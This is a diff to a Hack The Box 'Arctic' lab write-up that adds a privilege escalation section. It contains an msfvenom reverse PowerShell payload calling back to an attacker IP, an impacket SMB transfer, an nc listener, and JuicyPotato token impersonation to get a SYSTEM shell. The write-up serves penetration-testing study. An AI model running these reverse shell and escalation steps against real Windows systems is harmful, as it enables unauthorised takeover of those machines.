@@ -94,13 +94,13 @@ After execution a reverse shell was obtained as `arctic\tolis` with shell contex
 
 ## 7. Post-Exploitation
 
-System enumeration was performed to identify the operating system as **Microsoft Windows Server 2008 R2 Standard Build 7600**.
+System enumeration was performed identifying the operating system as **Microsoft Windows Server 2008 R2 Standard Build 7600**:
 
 ```
 systeminfo
 ```
 
-Privilege enumeration identified **SeImpersonatePrivilege** as enabled.
+Privilege enumeration identified **SeImpersonatePrivilege** as enabled:
 
 ```
 whoami /priv
@@ -114,9 +114,57 @@ Based on OS version and privileges, token impersonation with *JuicyPotato* or *R
 
 ## 8. Privilege Escalation
 
+JuicyPotato was selected due to compatibility with Windows Server 2008 R2 and enabled `SeImpersonatePrivilege`.
+
+A reverse shell payload was generated:
+
+```
+msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.16 lport=9999 > shell.bat
+```
+
+An SMB server was started on the attacker machine to transfer required files:
+
+```
+impacket-smbserver TMP /root/htb/arctic -smb2support
+```
+
+Files were copied to a writeable directory (`C:\Users\Public`) on the target:
+
+```
+copy \\10.10.14.16\TMP\JuicyPotato.exe
+
+copy \\10.10.14.16\TMP\shell.bat
+```
+
+A listener was started on the attacker machine:
+
+```
+nc -lnvp 9999
+```
+
+JuicyPotato was executed to spawn a SYSTEM shell:
+
+```
+JuicyPotato.exe -t * -p shell.bat -l 4444
+```
+
+A reverse shell was received as **NT AUTHORITY\SYSTEM**.
+
 ---
 
 ## 9. Proof of Compromise
+
+**User Flag**: *REDACTED*
+
+```
+type C:\Users\tolis\Desktop\user.txt
+```
+
+**Root Flag**: *REDACTED*
+
+```
+type C:\Users\Administrator\Desktop\root.txt
+```
 
 ---
 
@@ -128,3 +176,6 @@ Based on OS version and privileges, token impersonation with *JuicyPotato* or *R
 
 ColdFusion 8 Remote Command Execution vulnerability (CVE-2009-2265):
 [https://www.exploit-db.com/exploits/50057](https://www.exploit-db.com/exploits/50057)
+
+JuicyPotato SeImpersonatePrivilege Tool for Mid-era Windows (7/2008/2012):
+[https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
